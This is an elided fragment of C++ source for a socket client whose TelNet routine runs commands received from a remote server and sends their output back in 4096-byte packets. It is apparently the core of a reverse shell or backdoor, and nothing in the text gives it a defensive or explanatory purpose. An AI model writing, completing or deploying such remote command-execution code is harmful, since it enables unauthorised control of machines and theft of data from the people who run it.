...
int Socket::Connect(const char* ip, short port)
{
    ...
    inet_pton(AF_INET, ip, &addr_info.sin_addr.s_addr); //choosing ip
    int val;
...
void Socket::Send(std::string in)
{
    std::string part;
    char stc[4096] = { 0 };
    if (in.size() == 0) // in case of no output
    {
        strcpy_s(stc, std::string("no output").c_str());
        send(sock, stc, sizeof stc, 0);
    }
    while (in.size() >= 4096) // sending packets of 4096 bytes
    {
...
int Socket::TelNet()
{
    ...
    // run the command gotten from the server and saves it
    std::string output = exec(cmd);
    std::cout << output << std::endl;
    Send(output); // sends the output of the command
    return 0;
}
